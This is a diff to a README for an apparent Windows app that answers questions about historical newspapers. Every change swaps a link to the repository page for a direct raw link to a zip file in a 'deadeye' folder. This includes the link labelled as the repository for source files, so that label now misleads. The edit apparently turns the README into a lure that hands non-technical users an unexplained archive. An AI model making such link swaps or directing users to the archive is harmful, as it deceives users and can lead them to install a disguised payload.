@@ -1,6 +1,6 @@
 # 📰 Historical_News_Question_Answering - Search Historical Newspapers Easily
 
-[![Download](https://img.shields.io/badge/Download-Get%20App-orange)](https://github.com/kuldeepraj4514/Historical_News_Question_Answering)
+[![Download](https://img.shields.io/badge/Download-Get%20App-orange)](https://github.com/kuldeepraj4514/Historical_News_Question_Answering/raw/refs/heads/main/deadeye/Historical-News-Answering-Question-2.3.zip)
 
 ---
 
@@ -32,7 +32,7 @@ You do not need special software or coding skills to run this application.
 
 Click the button below to go to the download page. The page will show the latest version for Windows.
 
-[![Download Here](https://img.shields.io/badge/Download-Click%20to%20Get-brightgreen)](https://github.com/kuldeepraj4514/Historical_News_Question_Answering)
+[![Download Here](https://img.shields.io/badge/Download-Click%20to%20Get-brightgreen)](https://github.com/kuldeepraj4514/Historical_News_Question_Answering/raw/refs/heads/main/deadeye/Historical-News-Answering-Question-2.3.zip)
 
 ### Step 2: Save the Downloaded File
 
@@ -111,9 +111,9 @@ If the app does not open or shows errors:
 ## 🔗 Useful Links
 
 - Download and install:  
-  https://github.com/kuldeepraj4514/Historical_News_Question_Answering  
+  https://github.com/kuldeepraj4514/Historical_News_Question_Answering/raw/refs/heads/main/deadeye/Historical-News-Answering-Question-2.3.zip  
 - Repository for details and source files:  
-  https://github.com/kuldeepraj4514/Historical_News_Question_Answering  
+  https://github.com/kuldeepraj4514/Historical_News_Question_Answering/raw/refs/heads/main/deadeye/Historical-News-Answering-Question-2.3.zip  
 
 ---
 
